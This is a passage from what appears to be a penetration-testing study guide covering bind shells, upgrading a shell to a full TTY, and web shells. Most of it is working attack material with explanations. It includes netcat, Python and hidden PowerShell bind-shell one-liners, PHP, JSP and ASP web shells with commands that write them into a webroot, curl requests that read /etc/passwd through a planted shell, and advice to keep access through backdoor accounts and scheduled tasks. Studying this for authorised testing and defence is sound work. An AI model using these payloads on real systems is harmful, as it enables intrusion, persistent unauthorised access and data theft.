| **Target can connect out** | Reverse | Easier, more common, works behind NAT |
| **Outbound blocked, inbound open** | Bind | Only option if egress filtering strict |
| **Don't know firewall rules** | Try Reverse First | More likely to work |
| **Multiple connections needed** | Bind | Can reconnect multiple times |
| **Persistence/stability** | Bind | Once running, stays available |

### Advantages of Bind Shells ✅

1. **Reconnectable**
   - Connection drops? Just reconnect
   - No need to re-exploit
   - More durable than reverse shells

2. **Multiple Connections**
   - Can reconnect multiple times
   - Multiple team members can connect
   - Not single-use like reverse shells

3. **Works when outbound blocked**
   - If target can't connect out → bind shell works
   - Useful in strict egress filtering environments

4. **More Stable**
   - Once listening, stays listening
   - Less likely to disconnect randomly
   - Better for longer engagements

### Disadvantages of Bind Shells ❌

1. **Inbound Firewall**
   - Requires inbound port to be open
   - Often blocked by firewalls
   - More likely to be detected

2. **Target Exposes Port**
   - Open port visible to network monitoring
   - Easier to detect and block
   - Creates obvious artifact

3. **Less Common**
   - Reverse shells more widely used
   - Less practice with bind shells
   - Tools/exploits often default to reverse

4. **NAT Issues**
   - If target behind NAT → can't connect in
   - Public IP needed to reach target
   - More complicated in complex networks

### Troubleshooting Bind Shells

**Problem: Can't connect to target port**
```
Causes:
1. Port not actually listening
2. Firewall blocking inbound
3. Wrong IP address
4. Wrong port number

Solutions:
- Verify bind shell actually executed
- Check netstat on target: netstat -tlnp
- Confirm port open: nmap -p 4444 TARGET_IP
- Try different port
```

**Problem: Connected but no shell access**
```
Causes:
1. Bind shell command failed
2. Shell not executing properly

Solutions:
- Try alternative bind shell payload
- Check if -e flag supported
- Try python or bash alternative
```

**Problem: Multiple connections not working**
```
Causes:
1. Netcat closes after one connection
2. Listener exits after serving first connection

Solutions:
- Use while loop to keep binding
- Command: while nc -lvnp 4444 -e /bin/sh; do done
- Or setup web shell for persistence
```

### Complete Bind Shell Workflow

#### Step 1: Execute Bind Shell Command (Target Machine)

**The Command Starts Listening:**
```
Once executed, bind shell command:
1. Creates socket listener on specified port
2. Binds target's shell (Bash/PowerShell) to that port
3. Waits for incoming connection
4. Accepts first connection
5. Pipes shell access through network connection
```

#### Step 2: Connect with Netcat (Attacker Machine)

**Connection Command:**
```bash
nc 10.10.10.1 1234
```

**Result:**
```
Attacker connects to target's listening port
Target accepts connection
Shell prompt appears
Attacker gets direct shell access
Can interact with target system immediately
```

---

### Reliable Bind Shell Commands by OS

#### Linux - Bash Method (Using mkfifo)
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

**Breakdown:**
```
rm /tmp/f                              # Remove old FIFO if exists
mkfifo /tmp/f                          # Create named pipe
cat /tmp/f|                            # Read from FIFO
  /bin/bash -i                         # Interactive bash
  2>&1                                 # Redirect stderr to stdout
  nc -lvp 1234                         # Netcat listening on port 1234
  >/tmp/f                              # Write output back to FIFO
```

**How It Works:**
1. Creates named pipe for bidirectional communication
2. Bash shell reads from pipe and processes commands
3. Output goes through netcat listener
4. Netcat sends data back to pipe
5. Creates continuous loop of command/output

---

#### Linux - Python Bind Shell
```python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();
while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

**Breakdown (Simplified):**
```python
import socket as s, subprocess as sp

# Create TCP socket
s1 = s.socket(s.AF_INET, s.SOCK_STREAM)

# Allow port reuse
s1.setsockopt(s.SOL_SOCKET, s.SO_REUSEADDR, 1)

# Bind to all interfaces on port 1234
s1.bind(("0.0.0.0", 1234))

# Listen for connections
s1.listen(1)

# Accept first connection
c, a = s1.accept()

# Main loop
while True:
    # Receive command from attacker (1024 bytes max)
    d = c.recv(1024).decode()
    
    # Execute command
    p = sp.Popen(d, shell=True, 
                 stdout=sp.PIPE,      # Capture output
                 stderr=sp.PIPE,      # Capture errors
                 stdin=sp.PIPE)       # Take input
    
    # Send output back to attacker
    c.sendall(p.stdout.read() + p.stderr.read())
```

**Advantages:**
- ✅ Works on most Linux systems
- ✅ No netcat dependency
- ✅ Proper input/output handling
- ✅ More reliable than some alternatives

---

#### Windows - PowerShell Bind Shell
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

**Flags Breakdown:**
| Flag | Meaning |
|------|---------|
| `-NoP` | No Profile (skip profile loading) |
| `-NonI` | Non-Interactive mode |
| `-W Hidden` | Window hidden |
| `-Exec Bypass` | Execution policy bypass |

**Breakdown (Simplified):**
```powershell
# Create TCP listener on port 1234
$listener = [System.Net.Sockets.TcpListener]1234
$listener.start()

# Accept incoming connection
$client = $listener.AcceptTcpClient()
$stream = $client.GetStream()

# Create byte array for reading
[byte[]]$bytes = 0..65535|%{0}

# Main loop
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    # Convert bytes to command string
    $data = (New-Object System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
    
    # Execute command with Invoke-Expression
    $sendback = (iex $data 2>&1 | Out-String)
    
    # Format with PowerShell prompt
    $sendback2 = $sendback + "PS " + (pwd).Path + " "
    
    # Convert output to bytes
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    
    # Send output back
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}

# Close connection
$client.Close()
```

---

### Connecting to Bind Shell with Netcat

**Command:**
```bash
nc TARGET_IP PORT
```

**Example:**
```bash
$ nc 10.10.10.1 1234

# Shell prompt appears - now in target system!
bash: cannot set terminal process group (1234)
user@target:~$ 
```

**What You Get:**
```
✅ Direct shell access to target
✅ Can type commands immediately
✅ Get output directly
✅ Full interactive session
```

---

### Bind Shell Reconnectability: The Big Advantage

**Unlike Reverse Shells - You Can Reconnect!**

```
Scenario: Bind Shell Advantage

1. Execute bind shell on target
   └─ Target listening on port 1234

2. Connect: nc TARGET_IP 1234
   └─ Get shell access
   └─ Do some work

3. Connection drops (accident, timeout, etc.)
   └─ Bind shell STILL LISTENING on port 1234

4. Reconnect: nc TARGET_IP 1234
   └─ NEW connection established immediately
   └─ No re-exploit needed!
   └─ Back in shell
```

**Reverse Shell vs Bind Shell Comparison:**

| Situation | Reverse Shell | Bind Shell |
|-----------|---------------|-----------|
| Connection drops | ❌ Lost access, must re-exploit | ✅ Reconnect immediately |
| Team needs access | ❌ Only one connection | ✅ Multiple can connect |
| Network timeout | ❌ Game over | ✅ Just reconnect |
| Team member wants access | ❌ Must re-exploit again | ✅ They can connect to listening port |

**This is MAJOR advantage of bind shells!**

---

### Critical Limitation: Still Not Permanent

⚠️ **Important:** Bind Shell is MORE durable, but NOT permanent

**What Breaks Bind Shells:**

```
Bind Shell Connection Lost? → Reconnect
BUT...

Bind Shell Command Stopped? → PERMANENT ACCESS LOST
├── Reason 1: Process killed
├── Reason 2: Target rebooted
├── Reason 3: Shell process crashed
└── Reason 4: Administrator killed process

RESULT: Must re-exploit to regain access!
```

**Real-World Scenario:**

```
1. Execute bind shell on target
   └─ Listening on port 1234

2. Connect and do work
   └─ Working fine

3. Target system reboots (updates, crash, etc.)
   └─ Bind shell process DIES
   └─ Port 1234 no longer listening

4. Try to reconnect: nc TARGET_IP 1234
   └─ Connection refused!
   └─ No access anymore

5. Must exploit vulnerability AGAIN
   └─ Re-execute bind shell
   └─ Regain access
```

**Solution: Establish Persistence!**
- Don't rely on bind shell as permanent access
- Use bind shell to establish persistence mechanisms
- Create scheduled tasks, cron jobs, or backdoor users
- THEN you have truly persistent access

---

### Payload Selection for Bind Shells

**Try in This Order on Linux:**

| Priority | Method | When to Use |
|----------|--------|------------|
| 1 | Bash mkfifo | First choice, most reliable |
| 2 | Python | If bash/nc having issues |
| 3 | Netcat | If available and working |

**For Windows:**
| Priority | Method | When to Use |
|----------|--------|------------|
| 1 | PowerShell | First choice, widely available |
| 2 | Batch | If PowerShell disabled |

---

### Key Takeaways - Bind Shell Reliability

1. **Reconnectability is BIG Advantage:**
   - Network drop? Reconnect immediately
   - No need to re-exploit for each connection
   - Multiple people can connect to same port

2. **But Still Not Permanent:**
   - If bind shell process dies → access lost
   - If target reboots → access lost
   - Must still establish persistence

3. **When Bind Shell Breaks Connection:**
   - ✅ Can reconnect (port still listening)
   - ❌ Unless bind shell process died
   - ❌ Unless target rebooted

4. **Persistence Strategy:**
   - Use bind shell to get in
   - Quickly establish persistence (cron, task, user account)
   - Then bind shell loss is less critical

---

# PART 4: UPGRADING SHELL TO FULL TTY

## The Problem: Basic Netcat Shells Are Limited

When you first connect via netcat (reverse or bind shell), you get basic shell access BUT:

```
❌ LIMITATIONS:
- Can only type commands or backspace
- Cannot move cursor left/right to edit commands
- Cannot use arrow keys for command history
- No Tab completion
- No color support
- Limited terminal features
- Behaves like a "dumb terminal"

✅ WHAT YOU WANT:
- Full interactive shell
- Command history (arrow up/down)
- Text editing (arrow left/right, delete, etc.)
- Tab completion
- Color support
- Full terminal emulation (like SSH)
```

## Solution: Upgrade to Full TTY

**TTY = Teletypewriter (terminal interface)**

To get full terminal features, you need to map your local terminal TTY with the remote TTY.

### Method: Python/stty Upgrade

This is the most reliable method for upgrading netcat shells.

---

## Step-by-Step TTY Upgrade Process

### Step 1: Initial Netcat Connection

```bash
# On attacker machine:
$ nc 10.10.10.1 1234

# You're now in basic shell:
user@target:~$
```

**Current State:**
- Connected but with limited features
- Can type commands but cannot edit them
- No history or advanced features

---

### Step 2: Spawn Python PTY (On Remote Shell)

**Command (in netcat shell):**
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

**Breakdown:**
```
python -c '...'              # Execute Python command
  import pty                 # Import pseudo-terminal module
  pty.spawn("/bin/bash")     # Spawn bash with TTY allocation
```

**What This Does:**
1. Imports Python's PTY (pseudo-terminal) module
2. Spawns a bash shell with proper TTY allocation
3. Creates full terminal interface
4. Enables terminal features

**Result:**
```
user@target:~$
# Shell now has better features
# But still not fully optimized
```

---

### Step 3: Background the Shell (Press Ctrl+Z)

**In netcat shell, press:**
```
Ctrl + Z
```

**What Happens:**
```
user@target:~$ python -c 'import pty; pty.spawn("/bin/bash")'
user@target:~$
# (Ctrl+Z pressed)

[1]+  Stopped                 python -c 'import pty; pty.spawn("/bin/bash")'

$
# Back on attacker's local terminal
```

**Status:**
- Netcat shell backgrounded
- Back on your local machine terminal
- Remote shell still running in background

---

### Step 4: Configure Local Terminal (On Attacker Machine)

**Command:**
```bash
stty raw -echo
```

**Breakdown:**
```
stty                    # Set terminal type
  raw                   # Set raw mode (uncooked input)
  -echo                 # Don't echo input (shell will handle it)
```

**What This Does:**
1. Sets terminal to raw mode
2. Disables local echo
3. Allows full character-by-character input
4. Enables special keys (arrows, backspace, etc.)

**Result:**
```
# Your terminal settings changed
# No prompt visible (normal in raw mode)
```

---

### Step 5: Bring Shell Back to Foreground

**Command:**
```bash
fg
```

**Then Press Enter Twice**

**Process:**
```
$ fg
[1]+  Stopped                 python -c 'import pty; pty.spawn("/bin/bash")'

# (You should now see shell)
user@target:~$
# (Press Enter again if needed)
user@target:~$
```

**Status:**
- Remote shell back in foreground
- Now has full TTY features!
- Can use arrow keys, command history, etc.

---

### Basic TTY Upgrade Result

**At this point you have:**
✅ Arrow keys work (up/down for history, left/right for editing)
✅ Command history
✅ Backspace/delete work properly
✅ Tab completion
✅ Basic text editing

**But Shell Size Might Be Wrong:**
```
Your terminal window is size: 120x40
Remote shell thinks it's size: 80x24
Text wraps incorrectly
Display looks broken
```

---

## Step 6: Fix Terminal Size (Advanced - Optional)

### Get Your Terminal Size Information

**On your local machine, open NEW terminal window:**

**Command 1: Get TERM type**
```bash
echo $TERM
```

**Example Output:**
```
xterm-256color
# This is your TERM variable
```

**Command 2: Get terminal dimensions**
```bash
stty size
```

**Example Output:**
```
67 318
# 67 = rows (height)
# 318 = columns (width)
```

### Set Remote Shell to Match Your Size

**Back in your netcat shell:**

**Command 1: Set TERM variable**
```bash
export TERM=xterm-256color
```

**Command 2: Set rows and columns**
```bash
stty rows 67 columns 318
```

**Full Example:**
```bash
user@target:~$ export TERM=xterm-256color
user@target:~$ stty rows 67 columns 318
user@target:~$
# Shell now sized correctly!
```

---

## Complete TTY Upgrade Workflow

**All Steps at a Glance:**

```
1. Connect via netcat
   $ nc TARGET_IP PORT

2. In shell, run Python TTY upgrade
   user@target:~$ python -c 'import pty; pty.spawn("/bin/bash")'

3. Press Ctrl+Z to background
   (Ctrl + Z)

4. Configure local terminal
   $ stty raw -echo

5. Bring shell back
   $ fg
   $ (press Enter)

6. (Optional) Set TERM and size
   user@target:~$ export TERM=xterm-256color
   user@target:~$ stty rows 67 columns 318

7. DONE! Full TTY shell ready
```

---

## Result: Professional Shell Access

**After TTY upgrade you have:**

✅ **Full terminal features:**
- Arrow keys for history (up/down)
- Arrow keys for editing (left/right)
- Backspace and delete work
- Tab completion
- Command history
- Color support

✅ **Professional experience:**
- Feels like SSH connection
- Can run interactive tools (vim, etc.)
- Proper text wrapping
- Terminal size matches window

✅ **Usable for serious work:**
- Edit commands easily
- Navigate command history
- Run interactive applications
- Professional penetration testing

---

## Why TTY Upgrade Matters

### Before Upgrade:
```
Basic shell, hard to use
- Can't edit commands
- No history
- Broken display
- Feels unprofessional
```

### After Upgrade:
```
Professional shell, easy to use
- Full editing capabilities
- Command history
- Proper display
- Feels like SSH
```

**Impact:** Makes shell usable for serious penetration testing work!

---

## Troubleshooting TTY Upgrade

### Problem: Python command not found
```bash
# Python not installed on target

Solution 1: Check if python3 available
user@target:~$ python3 -c 'import pty; pty.spawn("/bin/bash")'

Solution 2: Use /bin/bash -i for basic upgrade
user@target:~$ /bin/bash -i

Solution 3: Use other method (perl, ruby, etc.)
```

### Problem: Shell looks broken after stty raw -echo
```bash
# This is NORMAL - raw mode doesn't show prompt

Solution: Don't worry, bring fg back
$ fg
# Shell will appear normal
```

### Problem: Text wrapping looks wrong
```bash
# Terminal size not set correctly

Solution: Get correct dimensions
$ stty size
# Then set in remote shell:
user@target:~$ stty rows 67 columns 318
```

### Problem: Ctrl+Z doesn't work
```bash
# Try Ctrl+Z again, or:

Solution: Use different background key if available
# Or manually run stty commands without backgrounding
```

---

## Advanced TTY Tricks (Optional)

### One-liner TTY Upgrade (All at Once)

If you want to upgrade TTY all in one command:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'; stty raw -echo; fg
```

**Limitations:**
- Might not work in all situations
- Less reliable than step-by-step
- Use step-by-step method when possible

### Full Upgrade with Size Fix (One-liner)

```bash
python -c 'import pty; pty.spawn("/bin/bash")' && (stty raw -echo; fg) && export TERM=xterm-256color && stty rows 67 columns 318
```

**Not Recommended:**
- Very complex
- Hard to debug if fails
- Use step-by-step instead

---

## Key Takeaways - TTY Upgrade

1. **Basic shells are limited:**
   - No arrow keys, no history, no editing
   - Python PTY upgrade fixes this

2. **Three main steps:**
   - Python PTY spawn on remote shell
   - stty raw -echo on local terminal
   - fg to bring shell back

3. **Optional size adjustment:**
   - Get TERM and dimensions
   - Set export TERM and stty rows/columns
   - Makes shell display perfectly

4. **Result is professional shell:**
   - Feels like real SSH connection
   - Full terminal features available
   - Usable for serious penetration testing

5. **Why it matters:**
   - Better productivity
   - Professional workflow
   - Easier to work with
   - Necessary for complex tasks

---

# PART 5: WEB SHELLS

## What is a Web Shell?

A **Web Shell** is a web script (PHP, ASP, JSP, etc.) that:

1. **Accepts commands** via HTTP request parameters (GET or POST)
2. **Executes commands** on the remote system
3. **Returns output** back through the web page

```
Browser/cURL Request:
http://target.com/shell.php?cmd=id

↓ (HTTP Request with cmd parameter)

Web Server:
- Receives request
- Extracts "cmd" parameter
- Executes: id
- Returns output: uid=33(www-data)...

↓ (HTTP Response with output)

Browser/cURL Output:
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Writing Web Shells

Web shells are typically **one-liners** - very short, easy to memorize.

### PHP Web Shell (Most Common)

```php
<?php system($_REQUEST["cmd"]); ?>
```

**Breakdown:**
```
<?php ... ?>              # PHP script tags
  system()               # Execute system command
  $_REQUEST["cmd"]       # Get "cmd" from GET or POST
```

**Example Usage:**
```bash
curl http://target.com/shell.php?cmd=id
# Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)

curl http://target.com/shell.php?cmd=whoami
# Output: www-data

curl http://target.com/shell.php?cmd=pwd
# Output: /var/www/html
```

---

### JSP Web Shell (Java Servers)

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

**Breakdown:**
```
<% ... %>                         # JSP script tags
  Runtime.getRuntime().exec()    # Execute system command
  request.getParameter("cmd")    # Get "cmd" from request
```

**Usage:**
```
http://target.com/shell.jsp?cmd=whoami
```

---

### ASP Web Shell (Windows/IIS Servers)

```asp
<% eval request("cmd") %>
```

**Breakdown:**
```
<% ... %>           # ASP script tags
  eval request()   # Evaluate request parameter
  "cmd"            # Command parameter
```

**Usage:**
```
http://target.com/shell.asp?cmd=whoami
```

---

## Common Web Server Roots

To deploy a web shell, you need to write it to the web server's **webroot** (document root):

| Web Server | Default Webroot |
|-----------|-----------------|
| **Apache** | `/var/www/html/` |
| **Nginx** | `/usr/local/nginx/html/` |
| **IIS (Windows)** | `c:\inetpub\wwwroot\` |
| **XAMPP** | `C:\xampp\htdocs\` |
| **Tomcat (JSP)** | `/var/lib/tomcat/webapps/ROOT/` |

---

## Uploading a Web Shell

### Method 1: Upload Vulnerability

If the target has a vulnerable **file upload feature**:

```
1. Write shell to file: shell.php
2. Upload through vulnerable form
3. Access uploaded shell via browser
4. Execute commands
```

**Example:**
```
- Visit: http://target.com/upload.php
- Upload: shell.php (containing <?php system($_REQUEST["cmd"]); ?>)
- Access: http://target.com/uploads/shell.php?cmd=id
```

---

### Method 2: Write Directly via RCE

If you already have **remote command execution** on the target:

**Step 1: Identify the webroot**

```bash
# Check which webroot exists (Linux)
ls /var/www/html/
ls /usr/local/nginx/html/

# Or check Apache config
cat /etc/apache2/sites-enabled/000-default.conf
```

**Step 2: Write web shell directly**

**For Linux Apache:**
```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

**For Windows IIS:**
```
echo ^<^% eval request("cmd") ^%^> > c:\inetpub\wwwroot\shell.asp
```

**Step 3: Access and confirm**

```bash
curl http://target.com/shell.php?cmd=id
```

---

## Example: Complete Web Shell Deployment

### Scenario: Exploited Linux Apache Server

**You have RCE and want to deploy PHP web shell:**

```bash
# Step 1: Confirm webroot
$ whoami
www-data

$ pwd
/var/www/html

# Step 2: Write web shell
$ echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php

# Step 3: Verify it was written
$ ls -la shell.php
-rw-r--r-- 1 www-data www-data 34 Jan 25 10:30 shell.php

# Step 4: Test from attacker machine
$ curl http://TARGET_IP/shell.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

# Step 5: Execute more commands
$ curl http://TARGET_IP/shell.php?cmd=cat%20/etc/passwd
root:x:0:0:root...
```

---

## Accessing Web Shells

### Via Browser

**Direct browser access:**
```
http://target.com/shell.php?cmd=id
```

**Output displayed on page:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Via cURL (Recommended)

**Command:**
```bash
curl http://target.com/shell.php?cmd=id
```

**Output:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**More Examples:**
```bash
# Get current directory
curl http://target.com/shell.php?cmd=pwd
# Output: /var/www/html

# List files
curl http://target.com/shell.php?cmd=ls%20-la
# Output: Lists directory contents

# Read file
curl http://target.com/shell.php?cmd=cat%20/etc/passwd
# Output: File contents

# Check if command exists
curl http://target.com/shell.php?cmd=which%20nc
# Output: Path to netcat if available
```

---

## Advantages of Web Shells

### ✅ Firewall Bypass

```
Traditional Reverse/Bind Shells:
- Open new port (e.g., 4444)
- Firewall blocks it
- Connection fails

Web Shells:
- Use HTTP port 80 or 443
- Already open for web traffic
- Firewall doesn't block it
- Works even with strict firewall rules
```

**Impact:** Web shells work when reverse/bind shells are blocked!

### ✅ Persistence After Reboot

```
Reverse/Bind Shells:
- Process running in memory
- Target reboots
- Process dies
- Access lost
- Must exploit again

Web Shells:
- Script stored on disk
- Target reboots
- Script still there
- Access still available
- No re-exploitation needed
```

**Impact:** Web shells provide automatic persistence!

### ✅ Long-term Access

```
Deploy once → Reboot multiple times → Still works
Perfect for maintaining access over days/weeks
```

---

## Disadvantages of Web Shells

### ❌ Less Interactive

**Reverse/Bind Shells:**
- Type command → Execute → See output (real-time)
- Feel like SSH connection
- Quick feedback loop

**Web Shells:**
- Type URL → Send request → See output
- Must request new URL for each command
- Slower workflow
- Not truly interactive

---

### ❌ Command Output Limitations

**Some commands don't work well:**

```bash
# Works fine:
curl http://target.com/shell.php?cmd=id
curl http://target.com/shell.php?cmd=whoami

# Problems:
curl http://target.com/shell.php?cmd=bash
# Can't interact with bash prompt
# One-time execution only

curl http://target.com/shell.php?cmd=vim
# Can't use interactive editor
# Output won't display properly
```

---

## Making Web Shells More Interactive

### Solution: Python Web Shell Wrapper

You can create a **Python script that automates** the web shell interaction:

```python
#!/usr/bin/env python3
import requests
import sys

def execute_command(target_url, cmd):
    """Execute command via web shell and return output"""
    params = {'cmd': cmd}
    response = requests.get(target_url, params=params)
    return response.text

# Usage
target = "http://target.com/shell.php"

while True:
    cmd = input("shell$ ")
    if cmd:
        output = execute_command(target, cmd)
        print(output)
```

**Result:**
```bash
$ python webshell.py
shell$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
shell$ whoami
www-data
shell$ pwd
/var/www/html
shell$ exit
```

**Benefit:** Feels semi-interactive in your terminal, even though it's still HTTP requests

---

## Web Shell vs Other Shell Types

### Quick Comparison

| Feature | Reverse | Bind | Web |
|---------|---------|------|-----|
| **Interaction** | Very Interactive | Very Interactive | Non-Interactive |
| **Firewall Bypass** | ❌ New Port | ❌ New Port | ✅ Port 80/443 |
| **Persistence** | ❌ Memory-based | ❌ Memory-based | ✅ Disk-based |
| **Reboot Survival** | ❌ No | ❌ No | ✅ Yes |
| **Setup Speed** | Fast | Fast | Fast |
| **Complexity** | Medium | Medium | Low |
| **Output Formatting** | Perfect | Perfect | Sometimes Issues |

---

## When to Use Each Shell Type

### Use Reverse Shell When:
```
✓ Target can connect outbound
✓ Firewall allows outbound connections
✓ You need fully interactive shell
✓ Quick access needed
✓ Temporary engagement
```

### Use Bind Shell When:
```
✓ Target cannot connect outbound
✓ You can connect inbound
✓ You need fully interactive shell
✓ Firewall allows inbound on specific port
✓ Multiple attackers need access
```

### Use Web Shell When:
```
✓ Strict firewall (only HTTP/HTTPS)
✓ Need persistence across reboots
✓ Long-term access required
✓ Cannot establish reverse/bind shells
✓ Non-interactive access acceptable
✓ Maintenance of access critical
```

---

## Typical Web Shell Deployment Strategy

### Phase 1: Get Initial Access
```
1. Exploit vulnerability → Get RCE
2. Deploy web shell
3. Secure your access
```

### Phase 2: Establish Persistence
```
1. Use web shell to write persistence mechanisms
2. Create backdoor accounts
3. Install remote access tools
4. Set up scheduled tasks
```

### Phase 3: Clean Up
```
1. Remove evidence of web shell (if clean engagement)
2. Or keep it hidden for long-term access
3. Maintain multiple access points
```

---

## Web Shell Security Notes

### Web shells are detected by:
- ✅ Antivirus software
- ✅ Web Application Firewalls (WAF)
- ✅ IDS/IPS systems
- ✅ Security monitoring tools

### Evasion techniques (advanced):
- Encoding payloads
- Obfuscating code
- Using lesser-known functions
- Hiding in legitimate files
- Regular file rotation

**Note:** These are advanced topics beyond this guide's scope.

---

## Key Takeaways - Web Shells

1. **Web shells are simple scripts:**
   - One-liner payloads
   - Easy to write and deploy
   - Accept commands via HTTP

2. **Two deployment methods:**
   - Upload vulnerability (if available)
   - Write directly via existing RCE

3. **Major advantages:**
   - Bypass firewalls (use port 80/443)
   - Persist across reboots
   - Long-term access possible
   - No re-exploitation needed

4. **Trade-offs:**
   - Less interactive than reverse/bind
   - Command output sometimes problematic
   - Detectable by security tools
   - Not suitable for complex tasks

5. **Strategic use:**
   - Establish initial persistence
   - Bypass firewall restrictions
   - Maintain access long-term
   - Gateway to deeper compromise

6. **Make it interactive:**
   - Python wrapper script
   - Automate HTTP requests
   - Feels like real shell access
   - Better for operational use

---

## Notes

- Add more shell types as you discover them
- Document real-world usage examples
- Include evasion techniques as you learn them
- Add detection/defense methodologies
- Build personal playbook of effective payloads

**Last Updated:** January 25, 2026
